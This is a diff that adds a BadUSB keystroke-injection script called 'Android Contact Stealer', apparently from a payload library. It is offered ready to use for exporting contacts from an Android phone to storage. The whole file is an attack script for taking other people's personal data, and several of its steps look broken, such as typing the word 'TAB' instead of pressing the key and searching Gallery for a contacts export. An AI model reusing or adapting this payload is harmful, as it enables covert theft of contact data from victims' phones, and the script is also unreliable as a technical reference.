@@ -1,0 +1,71 @@
+REM Title: Android Contact Stealer
+REM Author: BadUSB Library
+REM Description: Steals contacts and saves to file
+REM Target: Android 7.0+
+REM Category: Collection
+REM Type: Directly Ready
+
+REM Open Contacts app
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Contacts
+ENTER
+DELAY 3000
+
+REM Navigate through contacts
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
+
+REM Open Settings
+STRING Settings
+ENTER
+DELAY 2000
+
+STRING Import/Export
+ENTER
+DELAY 2000
+
+STRING Export to storage
+ENTER
+DELAY 2000
+
+REM Export contacts
+STRING Export
+ENTER
+DELAY 3000
+
+REM Open Gallery
+STRING Gallery
+ENTER
+DELAY 2000
+
+STRING Photos
+ENTER
+DELAY 2000
+
+REM Look for exported contacts
+STRING TAB
+ENTER
+DELAY 1000
+
+STRING TAB
+ENTER
+DELAY 1000
